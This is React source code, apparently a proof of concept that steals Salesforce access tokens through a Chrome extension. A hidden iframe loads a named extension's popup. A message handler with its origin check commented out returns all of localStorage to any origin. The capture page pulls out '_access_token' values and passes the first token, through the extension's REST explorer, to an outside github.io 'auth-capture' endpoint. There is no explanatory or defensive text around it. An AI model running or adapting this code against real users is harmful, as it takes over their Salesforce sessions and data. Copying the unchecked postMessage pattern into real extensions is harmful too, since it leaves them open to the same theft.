// Extension.js - This goes in your Chrome extension
import React, { useEffect } from 'react';

const ExtensionApp = () => {
  useEffect(() => {
    // Listen for messages from the parent window
    window.addEventListener('message', (event) => {
      // Verify origin if needed
      // if (event.origin !== "your-expected-origin") return;
      
      // Check if this is a request for initialization
      if (event.data === 'REQUEST_INIT') {
        // Send back the localStorage data
        const storageData = JSON.parse(JSON.stringify(localStorage));
        
        window.parent.postMessage({
          insextInitRequest: true,
          iFrameLocalStorage: storageData
        }, '*');
      }
    });
  }, []);

  return (
    <div className="p-4">
      <h1 className="text-lg font-bold">SFDC Inspector Extension</h1>
    </div>
  );
};

export default ExtensionApp;

// TokenCapture.js - This is your capture page component
import React, { useEffect, useState, useRef } from 'react';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';

const TokenCapture = () => {
  const [initialized, setInitialized] = useState(false);
  const [tokens, setTokens] = useState([]);
  const [storage, setStorage] = useState({});
  const [error, setError] = useState(null);
  const [status, setStatus] = useState('initializing'); // 'initializing' | 'connected' | 'error'
  const initFrameRef = useRef(null);

  const findAccessToken = (storage) => {
    const orgInstances = Object.entries(storage)
      .filter(([key]) => key.endsWith('_orgInstance'))
      .map(([key, value]) => ({
        instance: value,
        baseKey: key.replace('_orgInstance', '')
      }));

    return orgInstances.map(org => ({
      instance: org.instance,
      tokenKey: `${org.baseKey}_access_token`,
      token: storage[`${org.baseKey}_access_token`]
    }));
  };

  useEffect(() => {
    let timeoutId;
    
    const handleMessage = (event) => {
      // Ignore React DevTools messages
      if (event.data.source?.includes('react-devtools')) return;

      if (event.data.insextInitRequest && !initialized) {
        try {
          setInitialized(true);
          setStatus('connected');
          const storage = event.data.iFrameLocalStorage || {};
          const foundTokens = findAccessToken(storage);
          setTokens(foundTokens);
          setStorage(storage);
        } catch (err) {
          setError(`Error processing data: ${err.message}`);
          setStatus('error');
        }
      }
    };

    const initializeConnection = () => {
      // Create the initialization frame if it doesn't exist
      if (!initFrameRef.current) {
        const frame = document.createElement('iframe');
        frame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
        frame.style.display = 'none';
        document.body.appendChild(frame);
        initFrameRef.current = frame;

        // Send initialization request after frame loads
        frame.onload = () => {
          frame.contentWindow.postMessage('REQUEST_INIT', '*');
        };

        // Set timeout for initialization
        timeoutId = setTimeout(() => {
          if (!initialized) {
            setError('Connection timeout. Is the extension installed and enabled?');
            setStatus('error');
          }
        }, 5000);
      }
    };

    window.addEventListener('message', handleMessage);
    initializeConnection();

    return () => {
      window.removeEventListener('message', handleMessage);
      if (timeoutId) clearTimeout(timeoutId);
      if (initFrameRef.current) {
        initFrameRef.current.remove();
        initFrameRef.current = null;
      }
    };
  }, [initialized]);

  return (
    <div className="max-w-4xl mx-auto p-6 space-y-6">
      {status === 'initializing' && (
        <Alert>
          <AlertTitle>Connecting to Extension</AlertTitle>
          <AlertDescription>
            Please wait while we connect to the SFDC Inspector extension...
          </AlertDescription>
        </Alert>
      )}

      {error && (
        <Alert variant="destructive">
          <AlertTitle>Error</AlertTitle>
          <AlertDescription>{error}</AlertDescription>
        </Alert>
      )}

      {status === 'connected' && (
        <>
          <Card>
            <CardHeader>
              <CardTitle>Token Status</CardTitle>
            </CardHeader>
            <CardContent>
              {tokens.length === 0 ? (
                <div className="space-y-2">
                  <div className="text-red-600">No Access Tokens Found</div>
                  <div className="text-sm text-gray-600">
                    Looking for pattern: [instance]_access_token
                  </div>
                </div>
              ) : (
                <div className="space-y-4">
                  {tokens.map((token, index) => (
                    <div key={index} className="p-4 bg-gray-50 rounded-lg space-y-2">
                      <div className="font-medium">Instance: {token.instance}</div>
                      <div className="text-sm">Token Key: {token.tokenKey}</div>
                      <div className="text-sm font-mono break-all">
                        Token: {token.token ? 
                          `${token.token.substring(0, 20)}...` : 
                          'No token found'}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Storage Information</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-2">
                <div className="font-medium">Storage Keys:</div>
                <pre className="p-4 bg-gray-50 rounded-lg text-sm overflow-x-auto">
                  {JSON.stringify(Object.keys(storage), null, 2)}
                </pre>
              </div>
            </CardContent>
          </Card>

          {tokens.length > 0 && tokens[0].token && (
            <iframe
              src={`chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${new URLSearchParams({
                endpoint: '.samanattar.github.io/auth-capture',
                method: 'GET',
                format: 'json',
                cache: Date.now(),
                instance: tokens[0].instance,
                access_token: tokens[0].token
              }).toString()}`}
              className="w-full h-96 border border-gray-200 rounded-lg mt-4"
            />
          )}
        </>
      )}
    </div>
  );
};

export default TokenCapture;
